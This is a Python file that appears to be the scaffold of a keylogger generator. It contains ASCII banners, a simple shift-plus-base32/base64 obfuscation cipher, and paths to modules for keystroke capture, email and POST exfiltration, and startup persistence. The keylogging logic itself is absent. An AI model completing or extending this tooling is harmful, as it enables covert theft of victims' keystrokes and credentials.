import os
import base64

class Texts:
    TOPIC = """
888  /                     888                /       /                                   /~~88b 
888 /     e88~~8e  Y88b  / 888  e88~-_  e88~88e e88~88e  e88~~8e  888-~\       Y88b    / |   888 
888/\    d888  88b  Y888/  888 d888   i 888 888 888 888 d888  88b 888           Y88b  /  `  d88P 
888  \   8888__888   Y8/   888 8888   | "88_88" "88_88" 8888__888 888            Y88b/     d88P  
888   \  Y888    ,    Y    888 Y888   '  /       /      Y888    , 888             Y8/     d88P   
888    \  "88___/    /     888  "88_-~  Cb      Cb       "88___/  888              Y     d88P___ 
                   _/                    Y8""8D  Y8""8D                                          
                   
                                        by @hirushaadi
    """
    
    SUCCESS = """
 d88~\ 888  888  e88~~\  e88~~\  e88~~8e   d88~\  d88~\ 
C888   888  888 d888    d888    d888  88b C888   C888   
 Y88b  888  888 8888    8888    8888__888  Y88b   Y88b  
  888D 888  888 Y888    Y888    Y888    ,   888D   888D 
\_88P  "88_-888  "88__/  "88__/  "88___/  \_88P  \_88P  
    """
    
    ERROR = """
 e88~~8e  888-~\ 888-~\  e88~-_  888-~\ 
d888  88b 888    888    d888   i 888    
8888__888 888    888    8888   | 888    
Y888    , 888    888    Y888   ' 888    
 "88___/  888    888     "88_-~  888    
    """
    
    DONE = """
      888                             
 e88~\888  e88~-_  888-~88e  e88~~8e  
d888  888 d888   i 888  888 d888  88b 
8888  888 8888   | 888  888 8888__888 
Y888  888 Y888   ' 888  888 Y888    , 
 "88_/888  "88_-~  888  888  "88___/  
    """

class Cipher:
    def encrypt(plain_text, key=16):
        encrypted = ""
        for c in plain_text:
            if c.isupper():
                c_index = ord(c) - ord('A')
                c_shifted = (c_index + key) % 26 + ord('A')
                c_new = chr(c_shifted)
                encrypted += c_new
            elif c.islower():
                c_index = ord(c) - ord('a') 
                c_shifted = (c_index + key) % 26 + ord('a')
                c_new = chr(c_shifted)
                encrypted += c_new
            elif c.isdigit():
                c_new = (int(c) + key) % 10
                encrypted += str(c_new)
            else:
                encrypted += c
        encrypted = base64.b64encode(base64.b32encode(bytes(encrypted, encoding='utf-8')))
        return encrypted

    def decrypt(ciphertext, key=16):
        decrypted = ""
        ciphertext = str(base64.b32decode(base64.b64decode(str(ciphertext, encoding='utf-8'))), encoding='utf-8')
        for c in ciphertext:
            try:
                if c.isupper(): 
                    c_index = ord(c) - ord('A')
                    c_og_pos = (c_index - key) % 26 + ord('A')
                    c_og = chr(c_og_pos)
                    decrypted += c_og
                elif c.islower(): 
                    c_index = ord(c) - ord('a') 
                    c_og_pos = (c_index - key) % 26 + ord('a')
                    c_og = chr(c_og_pos)
                    decrypted += c_og
                elif c.isdigit():
                    c_og = (int(c) - key) % 10
                    decrypted += str(c_og)
                else:
                    decrypted += c
            except:
                decrypted += str(c)
        return decrypted

class FileNames:
    base = os.getcwd()
    modules = os.path.join(base, "modules")
    _1_imports = os.path.join(modules, "1.imports.py") 
    _2_cipher = os.path.join(modules, "2.cipher.py")
    class _3:
        base = os.getcwd()
        modules = os.path.join(base, "modules")
        email = os.path.join(modules, "3.keylogger.email.py") 
        file = os.path.join(modules, "3.keylogger.file.py") 
        post = os.path.join(modules, "3.keylogger.post.py") 
    _4_cipher = os.path.join(modules, "2.startup.py")
    class _5:
        base = os.getcwd()
        modules = os.path.join(base, "modules")
        email = os.path.join(modules, "5.keylogger.email.py") 
        file = os.path.join(modules, "5.keylogger.file.py") 
        post = os.path.join(modules, "5.keylogger.post.py") 
        
class Generate:
    
        
    def __init__(self) -> None:
        pass
    
    def loadModules(self):
        pass

